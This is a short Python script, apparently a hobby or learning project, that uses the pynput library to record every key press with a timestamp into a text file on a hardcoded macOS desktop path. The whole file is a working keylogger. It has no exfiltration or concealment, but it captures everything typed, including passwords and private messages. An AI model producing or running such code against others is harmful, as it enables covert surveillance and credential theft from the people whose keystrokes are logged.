from os import write
from pynput.keyboard import Listener

import os
import logging
from shutil import copyfile

username = os.getlogin()
logging_directory = f"/Users/davidtung/Desktop"

# print(logging_directory)

logging.basicConfig(filename=f"{logging_directory}/mylog.txt",
                    level=logging.DEBUG, format="%(asctime)s: %(message)s")


def key_handler(key):
    logging.info(key)


with Listener(on_press=key_handler) as listener:
    listener.join()
